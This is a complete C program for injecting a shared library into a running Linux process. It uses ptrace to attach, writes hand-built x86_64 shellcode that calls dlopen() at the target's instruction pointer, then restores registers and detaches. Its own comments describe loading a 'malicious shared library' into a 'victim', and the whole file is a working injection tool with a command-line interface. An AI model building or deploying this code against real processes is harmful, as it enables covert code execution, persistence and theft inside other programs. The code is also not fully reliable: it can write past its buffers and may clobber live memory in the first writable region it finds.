#define _GNU_SOURCE

/*
 * dlopen() Process Injection
 *
 * This technique forces a running process to load a malicious shared library
 * by using ptrace to hijack execution and call dlopen().
 *
 * This is more sophisticated than LD_PRELOAD as it works on already-running processes.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <unistd.h>
#include <errno.h>
#include <dlfcn.h>
#include <link.h>
#include <elf.h>
#include <limits.h>

/*
 * Find the address of a function in the target process
 * We need to find dlopen() address in the victim's address space
 */
unsigned long find_libc_function(pid_t pid, const char *func_name) {
    char maps_path[256];
    char line[512];
    unsigned long libc_base = 0;
    FILE *maps;

    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
    maps = fopen(maps_path, "r");
    if (!maps) {
        perror("fopen maps");
        return 0;
    }

    /* Find libc base address */
    while (fgets(line, sizeof(line), maps)) {
        if (strstr(line, "libc-") || strstr(line, "libc.so")) {
            unsigned long start, end, offset;
            char perms[5];
            if (sscanf(line, "%lx-%lx %4s %lx", &start, &end, perms,
                       &offset) == 4) {
                if (offset == 0) {
                    libc_base = start;
                    printf("[+] Found libc base: 0x%lx\n", libc_base);
                    break;
                }
            }
        }
    }
    fclose(maps);

    if (!libc_base) {
        fprintf(stderr, "[-] Failed to find libc base\n");
        return 0;
    }

    /*
     * Get dlopen offset from our own process
     * Assumption: Our libc and victim's libc have same layout
     */
    void *our_libc = dlopen("libc.so.6", RTLD_LAZY);
    if (!our_libc) {
        fprintf(stderr, "[-] Failed to open libc: %s\n", dlerror());
        return 0;
    }

    void *our_dlopen = dlsym(our_libc, func_name);
    if (!our_dlopen) {
        fprintf(stderr, "[-] Failed to find %s: %s\n", func_name, dlerror());
        dlclose(our_libc);
        return 0;
    }

    /* Calculate offset */
    struct link_map *lm;
    dlinfo(our_libc, RTLD_DI_LINKMAP, &lm);
    unsigned long our_libc_base = lm->l_addr;
    unsigned long offset = (unsigned long)our_dlopen - our_libc_base;

    dlclose(our_libc);

    unsigned long target_addr = libc_base + offset;
    printf("[+] %s address in target: 0x%lx\n", func_name, target_addr);

    return target_addr;
}

/*
 * Write data to target process memory
 */
int write_memory(pid_t pid, unsigned long addr, void *data, size_t len) {
    size_t i;
    long word;

    for (i = 0; i < len; i += sizeof(long)) {
        memcpy(&word, (char *)data + i, sizeof(long));
        if (ptrace(PTRACE_POKETEXT, pid, addr + i, word) == -1) {
            perror("ptrace poketext");
            return -1;
        }
    }
    return 0;
}

/*
 * Read data from target process memory
 */
int read_memory(pid_t pid, unsigned long addr, void *data, size_t len) {
    size_t i;
    long word;

    for (i = 0; i < len; i += sizeof(long)) {
        errno = 0;
        word = ptrace(PTRACE_PEEKTEXT, pid, addr + i, NULL);
        if (errno != 0) {
            perror("ptrace peektext");
            return -1;
        }
        memcpy((char *)data + i, &word, sizeof(long));
    }
    return 0;
}

/*
 * Find a writable memory region to store our library path
 */
unsigned long find_writable_region(pid_t pid, size_t size) {
    char maps_path[256];
    char line[512];
    unsigned long start, end;
    char perms[5];

    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
    FILE *maps = fopen(maps_path, "r");
    if (!maps) {
        perror("fopen maps");
        return 0;
    }

    while (fgets(line, sizeof(line), maps)) {
        if (sscanf(line, "%lx-%lx %4s", &start, &end, perms) == 3) {
            /* Look for readable and writable region */
            if (perms[0] == 'r' && perms[1] == 'w') {
                if (end - start >= size) {
                    fclose(maps);
                    printf("[+] Found writable region: 0x%lx-0x%lx\n", start, end);
                    return start;
                }
            }
        }
    }

    fclose(maps);
    return 0;
}

/*
 * Inject a shared library into the target process using dlopen
 */
int inject_library(pid_t pid, const char *library_path) {
    struct user_regs_struct saved_regs, regs;
    unsigned long dlopen_addr, writable_addr;
    char shellcode[256];
    unsigned char backup[256];
    int status;
    size_t lib_path_len = strlen(library_path) + 1;

    printf("[*] Attaching to process %d...\n", pid);

    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
        perror("ptrace attach");
        return -1;
    }

    waitpid(pid, &status, 0);
    printf("[+] Attached successfully\n");

    /* Save original registers */
    if (ptrace(PTRACE_GETREGS, pid, NULL, &saved_regs) == -1) {
        perror("ptrace getregs");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }

    printf("[+] Original RIP: 0x%llx\n", saved_regs.rip);

    /* Find dlopen address */
    dlopen_addr = find_libc_function(pid, "dlopen");
    if (!dlopen_addr) {
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }

    /* Find writable memory for library path */
    writable_addr = find_writable_region(pid, lib_path_len + sizeof(shellcode));
    if (!writable_addr) {
        fprintf(stderr, "[-] Failed to find writable region\n");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }

    printf("[*] Writing library path to 0x%lx...\n", writable_addr);

    /* Backup original memory */
    if (read_memory(pid, saved_regs.rip, backup, sizeof(backup)) == -1) {
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }

    /* Write library path to target memory */
    if (write_memory(pid, writable_addr, (void *)library_path, lib_path_len) == -1) {
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }

    /*
     * Create shellcode to call dlopen(library_path, RTLD_NOW)
     *
     * x86_64 calling convention:
     * - First arg (filename) in RDI
     * - Second arg (flags) in RSI
     * - Return value in RAX
     */
    memset(shellcode, 0, sizeof(shellcode));
    int idx = 0;

    /* mov rdi, writable_addr (library path address) */
    shellcode[idx++] = 0x48;
    shellcode[idx++] = 0xbf;
    memcpy(&shellcode[idx], &writable_addr, sizeof(writable_addr));
    idx += sizeof(writable_addr);

    /* mov rsi, RTLD_NOW */
    shellcode[idx++] = 0x48;
    shellcode[idx++] = 0xc7;
    shellcode[idx++] = 0xc6;
    *(int *)&shellcode[idx] = RTLD_NOW;
    idx += 4;

    /* mov rax, dlopen_addr */
    shellcode[idx++] = 0x48;
    shellcode[idx++] = 0xb8;
    memcpy(&shellcode[idx], &dlopen_addr, sizeof(dlopen_addr));
    idx += sizeof(dlopen_addr);

    /* call rax */
    shellcode[idx++] = 0xff;
    shellcode[idx++] = 0xd0;

    /* int3 (breakpoint to regain control) */
    shellcode[idx++] = 0xcc;

    printf("[*] Writing shellcode to 0x%llx...\n", saved_regs.rip);

    /* Write shellcode at current RIP */
    if (write_memory(pid, saved_regs.rip, shellcode, sizeof(shellcode)) == -1) {
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }

    printf("[*] Executing dlopen() in target process...\n");

    /* Execute the shellcode */
    if (ptrace(PTRACE_CONT, pid, NULL, NULL) == -1) {
        perror("ptrace cont");
        /* Restore memory */
        write_memory(pid, saved_regs.rip, backup, sizeof(backup));
        ptrace(PTRACE_SETREGS, pid, NULL, &saved_regs);
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }

    /* Wait for breakpoint (int3) */
    waitpid(pid, &status, 0);

    /* Get registers to check return value */
    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) == -1) {
        perror("ptrace getregs");
    } else {
        printf("[+] dlopen() returned: 0x%llx\n", regs.rax);
        if (regs.rax == 0) {
            fprintf(stderr, "[-] dlopen() failed (returned NULL)\n");
        } else {
            printf("[+] Library loaded successfully!\n");
        }
    }

    /* Restore original memory and registers */
    printf("[*] Restoring original state...\n");
    write_memory(pid, saved_regs.rip, backup, sizeof(backup));
    ptrace(PTRACE_SETREGS, pid, NULL, &saved_regs);

    /* Detach */
    if (ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1) {
        perror("ptrace detach");
        return -1;
    }

    printf("[+] Detached from process\n");
    return 0;
}

int main(int argc, char *argv[]) {
    pid_t target_pid;
    char *library_path;
    char abs_path[PATH_MAX];

    if (argc != 3) {
        fprintf(stderr, "Usage: %s <pid> <library.so>\n", argv[0]);
        return 1;
    }

    target_pid = atoi(argv[1]);
    library_path = argv[2];

    if (target_pid <= 0) {
        fprintf(stderr, "Invalid PID\n");
        return 1;
    }

    /* Convert to absolute path */
    if (realpath(library_path, abs_path) == NULL) {
        perror("realpath");
        return 1;
    }

    printf("=== dlopen() Shared Library Injection ===\n");
    printf("[*] Target PID: %d\n", target_pid);
    printf("[*] Library: %s\n", abs_path);
    printf("\n");

    if (inject_library(target_pid, abs_path) == 0) {
        printf("\n[SUCCESS] Library injected!\n");
        printf("[INFO] Check the victim process output for library messages\n");
        return 0;
    } else {
        fprintf(stderr, "\n[FAILED] Injection failed\n");
        return 1;
    }
}
